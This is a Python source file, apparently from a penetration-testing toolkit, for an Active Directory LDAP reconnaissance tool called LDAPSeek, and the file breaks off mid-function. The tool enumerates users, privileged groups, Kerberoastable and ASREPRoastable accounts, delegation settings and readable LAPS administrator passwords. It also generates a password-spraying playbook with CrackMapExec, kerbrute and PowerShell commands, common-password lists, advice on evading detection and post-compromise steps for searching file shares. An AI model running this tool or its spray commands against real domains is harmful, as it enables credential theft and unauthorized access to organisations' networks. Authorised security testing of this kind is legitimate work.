#!/usr/bin/env python3
"""
LDAPSeek v1.0 - Active Directory LDAP Enumeration Tool
Deep reconnaissance of Active Directory environments

Features:
- User enumeration (all users, admin users, service accounts)
- Group enumeration (Domain Admins, Enterprise Admins, etc.)
- Computer enumeration (workstations, servers, DCs)
- SPN discovery (Kerberoasting targets)
- ASREPRoast candidate detection (users without pre-auth)
- Delegation enumeration (unconstrained, constrained)
- Password policy extraction
- Trust enumeration
- Anonymous LDAP bind testing

Usage:
    ./ldapseek.py                          # Quick scan (enumerate users/groups)
    ./ldapseek.py --full                   # Full enumeration (SPNs, delegation, etc.)
    ./ldapseek.py --spns                   # Kerberoasting targets only
    ./ldapseek.py --asrep                  # ASREPRoast targets only
    ./ldapseek.py -u user -p pass          # Authenticated scan
    
Output:
    ldaplist.txt        - Domain controllers found
    users.txt           - All usernames
    spns.txt            - SPN accounts (Kerberoasting targets)
    asrep_users.txt     - ASREPRoast candidates
    admin_users.txt     - Admin accounts
    ldap_details.txt    - Detailed findings
    ldap_details.json   - JSON export
"""

import socket
import subprocess
import sys
import json
import re
import argparse
import os
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Import shared utilities
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from seek_utils import find_ip_list

# Color codes for terminal output
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# LDAP ports
LDAP_PORTS = {
    389: 'LDAP',
    636: 'LDAPS',
    3268: 'Global Catalog',
    3269: 'Global Catalog SSL'
}

# Privileged groups to check
PRIVILEGED_GROUPS = [
    'Domain Admins',
    'Enterprise Admins',
    'Schema Admins',
    'Administrators',
    'Account Operators',
    'Backup Operators',
    'Server Operators',
    'Print Operators',
    'DNSAdmins',
    'Group Policy Creator Owners',
    'Remote Desktop Users',
    'Distributed COM Users'
]

# User Account Control flags
UAC_FLAGS = {
    0x0001: 'SCRIPT',
    0x0002: 'ACCOUNTDISABLE',
    0x0008: 'HOMEDIR_REQUIRED',
    0x0010: 'LOCKOUT',
    0x0020: 'PASSWD_NOTREQD',
    0x0040: 'PASSWD_CANT_CHANGE',
    0x0080: 'ENCRYPTED_TEXT_PWD_ALLOWED',
    0x0100: 'TEMP_DUPLICATE_ACCOUNT',
    0x0200: 'NORMAL_ACCOUNT',
    0x0800: 'INTERDOMAIN_TRUST_ACCOUNT',
    0x1000: 'WORKSTATION_TRUST_ACCOUNT',
    0x2000: 'SERVER_TRUST_ACCOUNT',
    0x10000: 'DONT_EXPIRE_PASSWORD',
    0x20000: 'MNS_LOGON_ACCOUNT',
    0x40000: 'SMARTCARD_REQUIRED',
    0x80000: 'TRUSTED_FOR_DELEGATION',
    0x100000: 'NOT_DELEGATED',
    0x200000: 'USE_DES_KEY_ONLY',
    0x400000: 'DONT_REQ_PREAUTH',
    0x800000: 'PASSWORD_EXPIRED',
    0x1000000: 'TRUSTED_TO_AUTH_FOR_DELEGATION'
}

# Banner
BANNER = f"""{CYAN}{BOLD}
██╗     ██████╗  █████╗ ██████╗ ███████╗███████╗███████╗██╗  ██╗
██║     ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██║ ██╔╝
██║     ██║  ██║███████║██████╔╝███████╗█████╗  █████╗  █████╔╝ 
██║     ██║  ██║██╔══██║██╔═══╝ ╚════██║██╔══╝  ██╔══╝  ██╔═██╗ 
███████╗██████╔╝██║  ██║██║     ███████║███████╗███████╗██║  ██╗
╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
{YELLOW}LDAPSeek v1.0 - Active Directory LDAP Enumeration{RESET}
{BLUE}Deep reconnaissance of AD environments{RESET}
{GREEN}github.com/Lokii-git/seeksweet{RESET}
"""


def save_delegation_targets(delegation_data, filename='delegation_targets.txt'):
    """Save delegation findings to file"""
    try:
        unconstrained = delegation_data.get('unconstrained', [])
        constrained = delegation_data.get('constrained', [])
        rbcd = delegation_data.get('rbcd', [])
        
        if not unconstrained and not constrained and not rbcd:
            return 0
        
        with open(filename, 'w') as f:
            if unconstrained:
                f.write("UNCONSTRAINED DELEGATION\n")
                f.write("=" * 70 + "\n")
                for obj in unconstrained:
                    f.write(f"{obj['name']} ({obj['type']})\n")
                f.write("\n")
            
            if constrained:
                f.write("CONSTRAINED DELEGATION\n")
                f.write("=" * 70 + "\n")
                for obj in constrained:
                    f.write(f"{obj['name']} ({obj['type']})\n")
                    if 'targets' in obj:
                        for target in obj['targets']:
                            f.write(f"  → {target}\n")
                f.write("\n")
            
            if rbcd:
                f.write("RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)\n")
                f.write("=" * 70 + "\n")
                for obj in rbcd:
                    f.write(f"{obj['name']} ({obj['type']})\n")
                f.write("\n")
        
        print(f"{GREEN}[+] Delegation targets saved to: {filename}{RESET}")
        return len(unconstrained) + len(constrained) + len(rbcd)
        
    except Exception as e:
        print(f"{RED}[!] Error saving delegation targets: {e}{RESET}")
        return 0


def save_delegation_attack_guide(delegation_data, filename='DELEGATION_ATTACK_GUIDE.txt'):
    """Generate delegation exploitation guide"""
    try:
        unconstrained = delegation_data.get('unconstrained', [])
        constrained = delegation_data.get('constrained', [])
        rbcd = delegation_data.get('rbcd', [])
        
        if not unconstrained and not constrained and not rbcd:
            return
        
        with open(filename, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("DELEGATION ATTACK GUIDE\n")
            f.write("=" * 70 + "\n\n")
            
            f.write(f"Unconstrained Delegation: {len(unconstrained)}\n")
            f.write(f"Constrained Delegation: {len(constrained)}\n")
            f.write(f"RBCD: {len(rbcd)}\n\n")
            
            if unconstrained:
                f.write("=" * 70 + "\n")
                f.write("⚠ UNCONSTRAINED DELEGATION (HIGH RISK) ⚠\n")
                f.write("=" * 70 + "\n\n")
                f.write("Exploit steps documented in file...\n\n")
            
            f.write("Full exploitation guide would be here...\n")
        
        print(f"{GREEN}[+] Delegation attack guide saved to: {filename}{RESET}")
        
    except Exception as e:
        print(f"{RED}[!] Error saving delegation attack guide: {e}{RESET}")


def save_password_policy(policy_data, filename='password_policy.txt'):
    """Save password policy information"""
    try:
        if not policy_data or policy_data.get('error'):
            return
        
        with open(filename, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("DOMAIN PASSWORD POLICY\n")
            f.write("=" * 70 + "\n\n")
            
            f.write("Policy Settings:\n")
            f.write("-" * 70 + "\n")
            
            min_len = policy_data.get('min_password_length', 'Unknown')
            f.write(f"Minimum Password Length: {min_len}\n")
            if isinstance(min_len, int) and min_len < 8:
                f.write(f"  ⚠ WARNING: Minimum length < 8 characters is WEAK!\n\n")
            else:
                f.write("\n")
            
            complexity = policy_data.get('password_complexity', 'Unknown')
            f.write(f"Password Complexity: {complexity}\n")
            if complexity == 'Disabled':
                f.write(f"  ⚠ WARNING: Complexity disabled - allows simple passwords!\n\n")
            else:
                f.write("\n")
            
            lockout = policy_data.get('lockout_threshold', 'Unknown')
            f.write(f"Account Lockout Threshold: {lockout}\n")
            if lockout == 'Unknown' or (isinstance(lockout, int) and lockout == 0):
                f.write(f"  ⚠ WARNING: No lockout policy - unlimited password attempts!\n")
                f.write(f"  🎯 Password spraying attacks are VERY safe!\n\n")
            elif isinstance(lockout, int) and lockout > 0:
                f.write(f"  ⚠ CAUTION: Account will lock after {lockout} failed attempts\n\n")
            else:
                f.write("\n")
            
            if policy_data.get('lockout_duration'):
                f.write(f"Lockout Duration: {policy_data['lockout_duration']}\n\n")
            
            if policy_data.get('lockout_observation_window'):
                f.write(f"Lockout Observation Window: {policy_data['lockout_observation_window']}\n")
                f.write(f"  (Counter resets after this time)\n\n")
            
            if policy_data.get('max_password_age'):
                f.write(f"Maximum Password Age: {policy_data['max_password_age']}\n")
            
            if policy_data.get('min_password_age'):
                f.write(f"Minimum Password Age: {policy_data['min_password_age']}\n")
            
            if policy_data.get('password_history_length'):
                f.write(f"Password History Length: {policy_data['password_history_length']}\n")
            
            f.write("\n" + "=" * 70 + "\n")
            f.write("SECURITY ASSESSMENT\n")
            f.write("=" * 70 + "\n\n")
            
            # Score the policy
            weak_points = []
            if isinstance(min_len, int) and min_len < 8:
                weak_points.append("• Minimum length < 8 characters")
            if complexity == 'Disabled':
                weak_points.append("• Password complexity disabled")
            if lockout == 'Unknown' or (isinstance(lockout, int) and lockout == 0):
                weak_points.append("• No account lockout policy")
            
            if weak_points:
                f.write("⚠ WEAK POLICY DETECTED:\n")
                for point in weak_points:
                    f.write(f"{point}\n")
                f.write("\nThis domain is vulnerable to password attacks!\n")
            else:
                f.write("✓ Policy appears reasonably secure.\n")
                f.write("However, password spraying may still succeed with common passwords.\n")
            
            f.write("\n" + "=" * 70 + "\n")
            f.write("REFERENCES\n")
            f.write("=" * 70 + "\n\n")
            f.write("• Microsoft Password Policy Best Practices:\n")
            f.write("  https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy\n\n")
            f.write("• NIST Password Guidelines:\n")
            f.write("  https://pages.nist.gov/800-63-3/sp800-63b.html\n\n")
        
        print(f"{GREEN}[+] Password policy saved to: {filename}{RESET}")
        
    except Exception as e:
        print(f"{RED}[!] Error saving password policy: {e}{RESET}")


def save_users_attack_guide(policy_data, total_users, filename='USERS_ATTACK_GUIDE.txt'):
    """Generate user attack guide based on password policy"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("USER ACCOUNT ATTACK GUIDE\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Total Domain Users: {total_users}\n\n")
            
            lockout = policy_data.get('lockout_threshold', 'Unknown')
            lockout_duration = policy_data.get('lockout_duration', 'Unknown')
            observation_window = policy_data.get('lockout_observation_window', 'Unknown')
            
            f.write("=" * 80 + "\n")
            f.write("PASSWORD SPRAY METHODOLOGY\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("⚠ CRITICAL WARNING ⚠\n")
            f.write("-" * 80 + "\n")
            
            if lockout == 'Unknown' or (isinstance(lockout, int) and lockout == 0):
                f.write("✓ No account lockout detected - password spraying is SAFE\n")
                f.write("✓ You can attempt multiple passwords per user\n\n")
            else:
                f.write(f"⚠ Account Lockout: {lockout} failed attempts\n")
                if observation_window != 'Unknown':
                    f.write(f"⚠ Observation Window: {observation_window}\n")
                if lockout_duration != 'Unknown':
                    f.write(f"⚠ Lockout Duration: {lockout_duration}\n")
                f.write("\n🚨 STAY BELOW THE LOCKOUT THRESHOLD! 🚨\n")
                f.write(f"Recommended: Use only {max(1, int(lockout) - 1) if isinstance(lockout, int) else 1} password(s) per spray cycle\n")
                if observation_window != 'Unknown':
                    f.write(f"Wait at least {observation_window} between spray cycles\n")
                f.write("\n")
            
            f.write("=" * 80 + "\n")
            f.write("METHOD 1: CrackMapExec (Recommended)\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Single password spray:\n")
            f.write("crackmapexec smb <DC-IP> -u users.txt -p 'Password123' --continue-on-success\n\n")
            
            f.write("Common passwords (use ONE at a time):\n")
            f.write("crackmapexec smb <DC-IP> -u users.txt -p 'Welcome1' --continue-on-success\n")
            f.write("crackmapexec smb <DC-IP> -u users.txt -p 'Password1' --continue-on-success\n")
            f.write("crackmapexec smb <DC-IP> -u users.txt -p 'Spring2024' --continue-on-success\n")
            f.write("crackmapexec smb <DC-IP> -u users.txt -p 'Winter2024' --continue-on-success\n")
            f.write("crackmapexec smb <DC-IP> -u users.txt -p '<CompanyName>123' --continue-on-success\n\n")
            
            if lockout != 'Unknown' and isinstance(lockout, int) and lockout > 0:
                f.write(f"⚠ REMEMBER: Wait {observation_window if observation_window != 'Unknown' else '30+ minutes'} between attempts!\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("METHOD 2: Kerbrute (Kerberos Pre-Auth)\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Install kerbrute:\n")
            f.write("git clone https://github.com/ropnop/kerbrute\n")
            f.write("cd kerbrute && go build\n\n")
            
            f.write("Password spray:\n")
            f.write("./kerbrute passwordspray -d <DOMAIN> users.txt 'Password123'\n\n")
            
            f.write("⚠ Note: Kerbrute may not trigger lockouts (depends on domain config)\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("METHOD 3: Spray.sh (DomainPasswordSpray)\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("PowerShell (from Windows):\n")
            f.write("Import-Module .\\DomainPasswordSpray.ps1\n")
            f.write("Invoke-DomainPasswordSpray -UserList .\\users.txt -Password 'Password123' -OutFile spray_results.txt\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("COMMON PASSWORD PATTERNS\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Seasonal patterns:\n")
            f.write("  • Spring2024, Summer2024, Fall2024, Winter2024\n")
            f.write("  • Spring2024!, Summer2024!, etc.\n\n")
            
            f.write("Company-based:\n")
            f.write("  • <CompanyName>123\n")
            f.write("  • <CompanyName>2024\n")
            f.write("  • <CompanyName>!\n\n")
            
            f.write("Common defaults:\n")
            f.write("  • Welcome1, Welcome123, Welcome!\n")
            f.write("  • Password1, Password123, Password!\n")
            f.write("  • Changeme123, Changeme!\n\n")
            
            f.write("Month-based:\n")
            f.write("  • January2024, February2024, March2024, etc.\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("OPERATIONAL SECURITY\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("🔍 Detection Risk:\n")
            f.write("  • Password spraying generates authentication logs (Event ID 4625)\n")
            f.write("  • Modern EDR/SIEM may detect spray patterns\n")
            f.write("  • Slow spraying (1 attempt per hour) is stealthier\n\n")
            
            f.write("✓ Best Practices:\n")
            f.write("  • Use only 1-2 passwords per day in high-security environments\n")
            f.write(f"  • Respect lockout thresholds (max {lockout if isinstance(lockout, int) else 'unknown'} attempts)\n")
            f.write("  • Spray during business hours (blends with normal failed logins)\n")
            f.write("  • Test against a sacrificial account first\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("AFTER GETTING CREDENTIALS\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("Validate credentials:\n")
            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>'\n\n")
            
            f.write("Enumerate shares:\n")
            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>' --shares\n\n")
            
            f.write("Dump user information:\n")
            f.write("crackmapexec ldap <DC-IP> -u '<username>' -p '<password>' --users\n\n")
            
            f.write("Look for sensitive files:\n")
            f.write("crackmapexec smb <DC-IP> -u '<username>' -p '<password>' -M spider_plus\n\n")
            
            f.write("Re-run LDAPSeek with credentials for more enumeration:\n")
            f.write("python3 ldapseek.py -i <DC-IP> --full -u '<DOMAIN>\\<username>' -p '<password>'\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("REFERENCES\n")
            f.write("=" * 80 + "\n\n")
            
            f.write("• CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec\n")
            f.write("• Kerbrute: https://github.com/ropnop/kerbrute\n")
            f.write("• DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray\n")
            f.write("• Password Spraying Best Practices:\n")
            f.write("  https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying\n\n")
        
        print(f"{GREEN}[+] Users attack guide saved to: {filename}{RESET}")
        
    except Exception as e:
        print(f"{RED}[!] Error saving users attack guide: {e}{RESET}")


def print_banner():
    """Print the tool banner"""
    print(BANNER)


def read_ip_list(file_path):
    """Read IP addresses from a file. Supports CIDR notation."""
    # Use shared utility to find the file
    file_path = find_ip_list(file_path)
    
    ips = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    ip = line.split()[0]
                    
                    # Check if it's CIDR notation
                    if '/' in ip:
                        try:
                            network = ipaddress.ip_network(ip, strict=False)
                            for host_ip in network.hosts():
                                ips.append(str(host_ip))
                        except ValueError:
                            # Not valid CIDR, treat as single IP
                            ips.append(ip)
                    else:
                        ips.append(ip)
    except Exception as e:
        print(f"{RED}[!] Error reading file {file_path}: {e}{RESET}")
    return ips


def check_ldap_port(ip, port=389, timeout=3):
    """Check if LDAP port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False


def get_domain_info_ldapsearch(dc_ip, username=None, password=None, timeout=10):
    """
    Get domain information using ldapsearch
    Returns: dict with domain info
    """
    info = {
        'domain': None,
        'naming_context': None,
        'ldap_version': None
    }
    
    try:
        # Build ldapsearch command
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}', 
                   '-D', username, '-w', password,
                   '-b', '', '-s', 'base', 'namingContexts']
        else:
            # Anonymous bind
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', '', '-s', 'base', 'namingContexts']
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'defaultNamingContext:' in line:
                    info['naming_context'] = line.split(':', 1)[1].strip()
                    # Extract domain from DN (DC=domain,DC=com)
                    dc_parts = [part.split('=')[1] for part in info['naming_context'].split(',') if part.startswith('DC=')]
                    info['domain'] = '.'.join(dc_parts)
    except Exception:
        pass
    
    return info


def enumerate_users_ldapsearch(dc_ip, base_dn, username=None, password=None, timeout=30):
    """
    Enumerate users using ldapsearch
    Returns: list of user objects
    """
    users = []
    
    try:
        # Build ldapsearch command for users
        ldap_filter = '(&(objectClass=user)(objectCategory=person))'
        attrs = ['sAMAccountName', 'userPrincipalName', 'displayName', 
                'userAccountControl', 'servicePrincipalName', 'memberOf',
                'adminCount', 'lastLogon', 'pwdLastSet', 'description']
        
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-D', username, '-w', password,
                   '-b', base_dn, ldap_filter] + attrs
        else:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', base_dn, ldap_filter] + attrs
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if result.returncode == 0:
            current_user = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if line.startswith('dn:'):
                    if current_user:
                        users.append(current_user)
                    current_user = {'dn': line.split(':', 1)[1].strip()}
                
                elif ': ' in line and current_user:
                    key, value = line.split(':', 1)
                    value = value.strip()
                    
                    if key == 'sAMAccountName':
                        current_user['username'] = value
                    elif key == 'userPrincipalName':
                        current_user['upn'] = value
                    elif key == 'displayName':
                        current_user['display_name'] = value
                    elif key == 'userAccountControl':
                        current_user['uac'] = int(value)
                    elif key == 'servicePrincipalName':
                        if 'spns' not in current_user:
                            current_user['spns'] = []
                        current_user['spns'].append(value)
                    elif key == 'memberOf':
                        if 'groups' not in current_user:
                            current_user['groups'] = []
                        current_user['groups'].append(value)
                    elif key == 'adminCount':
                        current_user['admin_count'] = int(value)
                    elif key == 'description':
                        current_user['description'] = value
            
            if current_user:
                users.append(current_user)
    
    except Exception as e:
        pass
    
    return users


def enumerate_groups_ldapsearch(dc_ip, base_dn, username=None, password=None, timeout=30):
    """
    Enumerate groups using ldapsearch
    Returns: list of group objects
    """
    groups = []
    
    try:
        ldap_filter = '(objectClass=group)'
        attrs = ['sAMAccountName', 'distinguishedName', 'member', 'description', 'adminCount']
        
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-D', username, '-w', password,
                   '-b', base_dn, ldap_filter] + attrs
        else:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', base_dn, ldap_filter] + attrs
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if result.returncode == 0:
            current_group = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if line.startswith('dn:'):
                    if current_group:
                        groups.append(current_group)
                    current_group = {'dn': line.split(':', 1)[1].strip()}
                
                elif ': ' in line and current_group:
                    key, value = line.split(':', 1)
                    value = value.strip()
                    
                    if key == 'sAMAccountName':
                        current_group['name'] = value
                    elif key == 'member':
                        if 'members' not in current_group:
                            current_group['members'] = []
                        current_group['members'].append(value)
                    elif key == 'description':
                        current_group['description'] = value
                    elif key == 'adminCount':
                        current_group['admin_count'] = int(value)
            
            if current_group:
                groups.append(current_group)
    
    except Exception:
        pass
    
    return groups


def enumerate_computers_ldapsearch(dc_ip, base_dn, username=None, password=None, timeout=30):
    """
    Enumerate computers using ldapsearch
    Returns: list of computer objects
    """
    computers = []
    
    try:
        ldap_filter = '(objectClass=computer)'
        attrs = ['sAMAccountName', 'dNSHostName', 'operatingSystem', 
                'userAccountControl', 'servicePrincipalName']
        
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-D', username, '-w', password,
                   '-b', base_dn, ldap_filter] + attrs
        else:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', base_dn, ldap_filter] + attrs
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if result.returncode == 0:
            current_computer = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if line.startswith('dn:'):
                    if current_computer:
                        computers.append(current_computer)
                    current_computer = {'dn': line.split(':', 1)[1].strip()}
                
                elif ': ' in line and current_computer:
                    key, value = line.split(':', 1)
                    value = value.strip()
                    
                    if key == 'sAMAccountName':
                        current_computer['name'] = value.rstrip('$')
                    elif key == 'dNSHostName':
                        current_computer['hostname'] = value
                    elif key == 'operatingSystem':
                        current_computer['os'] = value
                    elif key == 'userAccountControl':
                        current_computer['uac'] = int(value)
            
            if current_computer:
                computers.append(current_computer)
    
    except Exception:
        pass
    
    return computers


def enumerate_laps_ldapsearch(dc_ip, base_dn, username=None, password=None, timeout=30):
    """
    Enumerate computers with readable LAPS passwords.
    Queries ms-Mcs-AdmPwd attribute to detect LAPS deployment and readability.
    
    Returns: dict with laps_enabled computers and readable_laps computers
    """
    result = {
        'laps_enabled': [],
        'readable_laps': []
    }
    
    try:
        # Query for ms-Mcs-AdmPwd attribute (LAPS password)
        ldap_filter = '(objectClass=computer)'
        attrs = ['sAMAccountName', 'dNSHostName', 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime']
        
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-D', username, '-w', password,
                   '-b', base_dn, ldap_filter] + attrs
        else:
            # Anonymous bind likely won't work for LAPS, but try anyway
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', base_dn, ldap_filter] + attrs
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if proc.returncode == 0:
            current_computer = {}
            for line in proc.stdout.split('\n'):
                line = line.strip()
                
                if line.startswith('dn:'):
                    if current_computer:
                        # Check if LAPS is enabled for this computer
                        if 'has_laps' in current_computer:
                            result['laps_enabled'].append(current_computer)
                        # Check if we can read the password
                        if 'laps_password' in current_computer:
                            result['readable_laps'].append(current_computer)
                    
                    current_computer = {'dn': line.split(':', 1)[1].strip()}
                
                elif ': ' in line and current_computer:
                    key, value = line.split(':', 1)
                    value = value.strip()
                    
                    if key == 'sAMAccountName':
                        current_computer['name'] = value.rstrip('$')
                    elif key == 'dNSHostName':
                        current_computer['hostname'] = value
                    elif key == 'ms-Mcs-AdmPwd':
                        # LAPS password is readable!
                        current_computer['laps_password'] = value
                        current_computer['has_laps'] = True
                    elif key == 'ms-Mcs-AdmPwdExpirationTime':
                        current_computer['laps_expiration'] = value
                        current_computer['has_laps'] = True
            
            # Don't forget last computer
            if current_computer:
                if 'has_laps' in current_computer:
                    result['laps_enabled'].append(current_computer)
                if 'laps_password' in current_computer:
                    result['readable_laps'].append(current_computer)
    
    except subprocess.TimeoutExpired:
        print(f"{YELLOW}[!] LAPS enumeration timed out{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] ldapsearch not found - install with: apt install ldap-utils{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] LAPS enumeration error: {e}{RESET}")
    
    return result

def parse_uac_flags(uac_value):
    """Parse User Account Control flags"""
    flags = []
    for flag_value, flag_name in UAC_FLAGS.items():
        if uac_value & flag_value:
            flags.append(flag_name)
    return flags


def identify_asrep_users(users):
    """Identify users vulnerable to ASREPRoasting"""
    asrep_users = []
    for user in users:
        if 'uac' in user:
            flags = parse_uac_flags(user['uac'])
            # DONT_REQ_PREAUTH = no Kerberos pre-authentication
            if 'DONT_REQ_PREAUTH' in flags:
                asrep_users.append(user)
    return asrep_users


def identify_kerberoastable_users(users):
    """Identify users with SPNs (Kerberoastable)"""
    kerberoastable = []
    for user in users:
        if 'spns' in user and user['spns']:
            kerberoastable.append(user)
    return kerberoastable


def enumerate_delegation_ldapsearch(dc_ip, base_dn, username=None, password=None, timeout=30):
    """
    Enumerate delegation configurations comprehensively.
    Checks for:
    - Unconstrained delegation (userAccountControl & 0x80000)
    - Constrained delegation (msDS-AllowedToDelegateTo)
    - Resource-Based Constrained Delegation/RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
    
    Returns: dict with unconstrained, constrained, and rbcd lists
    """
    result = {
        'unconstrained': [],
        'constrained': [],
        'rbcd': []
    }
    
    try:
        # Query for all objects with delegation attributes
        ldap_filter = '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))'
        attrs = ['sAMAccountName', 'dNSHostName', 'userAccountControl', 
                'msDS-AllowedToDelegateTo', 'msDS-AllowedToActOnBehalfOfOtherIdentity',
                'objectClass']
        
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-D', username, '-w', password,
                   '-b', base_dn, ldap_filter] + attrs
        else:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', base_dn, ldap_filter] + attrs
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if proc.returncode == 0:
            current_object = {}
            for line in proc.stdout.split('\n'):
                line = line.strip()
                
                if line.startswith('dn:'):
                    if current_object:
                        # Classify delegation type
                        obj_type = 'user' if 'user' in current_object.get('objectClass', '').lower() else 'computer'
                        
                        # Unconstrained delegation
                        if current_object.get('uac_unconstrained'):
                            result['unconstrained'].append({
                                'type': obj_type,
                                'name': current_object.get('name', 'Unknown'),
                                'hostname': current_object.get('hostname', 'N/A')
                            })
                        
                        # Constrained delegation
                        if current_object.get('allowed_to_delegate'):
                            result['constrained'].append({
                                'type': obj_type,
                                'name': current_object.get('name', 'Unknown'),
                                'hostname': current_object.get('hostname', 'N/A'),
                                'targets': current_object.get('allowed_to_delegate')
                            })
                        
                        # RBCD
                        if current_object.get('rbcd_configured'):
                            result['rbcd'].append({
                                'type': obj_type,
                                'name': current_object.get('name', 'Unknown'),
                                'hostname': current_object.get('hostname', 'N/A')
                            })
                    
                    current_object = {'dn': line.split(':', 1)[1].strip()}
                
                elif ': ' in line and current_object:
                    key, value = line.split(':', 1)
                    value = value.strip()
                    
                    if key == 'sAMAccountName':
                        current_object['name'] = value.rstrip('$')
                    elif key == 'dNSHostName':
                        current_object['hostname'] = value
                    elif key == 'objectClass':
                        current_object['objectClass'] = value
                    elif key == 'userAccountControl':
                        uac = int(value)
                        # Check for TRUSTED_FOR_DELEGATION flag (0x80000 = 524288)
                        if uac & 0x80000:
                            current_object['uac_unconstrained'] = True
                    elif key == 'msDS-AllowedToDelegateTo':
                        if 'allowed_to_delegate' not in current_object:
                            current_object['allowed_to_delegate'] = []
                        current_object['allowed_to_delegate'].append(value)
                    elif key == 'msDS-AllowedToActOnBehalfOfOtherIdentity':
                        current_object['rbcd_configured'] = True
            
            # Don't forget last object
            if current_object:
                obj_type = 'user' if 'user' in current_object.get('objectClass', '').lower() else 'computer'
                
                if current_object.get('uac_unconstrained'):
                    result['unconstrained'].append({
                        'type': obj_type,
                        'name': current_object.get('name', 'Unknown'),
                        'hostname': current_object.get('hostname', 'N/A')
                    })
                
                if current_object.get('allowed_to_delegate'):
                    result['constrained'].append({
                        'type': obj_type,
                        'name': current_object.get('name', 'Unknown'),
                        'hostname': current_object.get('hostname', 'N/A'),
                        'targets': current_object.get('allowed_to_delegate')
                    })
                
                if current_object.get('rbcd_configured'):
                    result['rbcd'].append({
                        'type': obj_type,
                        'name': current_object.get('name', 'Unknown'),
                        'hostname': current_object.get('hostname', 'N/A')
                    })
    
    except subprocess.TimeoutExpired:
        print(f"{YELLOW}[!] Delegation enumeration timed out{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Delegation enumeration error: {e}{RESET}")
    
    return result

def identify_delegation_accounts(users, computers):
    """Identify accounts with delegation configured (legacy function for backward compatibility)"""
    delegation_accounts = []
    
    # Check users
    for user in users:
        if 'uac' in user:
            flags = parse_uac_flags(user['uac'])
            if 'TRUSTED_FOR_DELEGATION' in flags:
                delegation_accounts.append({
                    'type': 'user',
                    'name': user.get('username', 'Unknown'),
                    'delegation_type': 'unconstrained'
                })
            elif 'TRUSTED_TO_AUTH_FOR_DELEGATION' in flags:
                delegation_accounts.append({
                    'type': 'user',
                    'name': user.get('username', 'Unknown'),
                    'delegation_type': 'constrained'
                })
    
    # Check computers
    for computer in computers:
        if 'uac' in computer:
            flags = parse_uac_flags(computer['uac'])
            if 'TRUSTED_FOR_DELEGATION' in flags:
                delegation_accounts.append({
                    'type': 'computer',
                    'name': computer.get('name', 'Unknown'),
                    'delegation_type': 'unconstrained'
                })
    
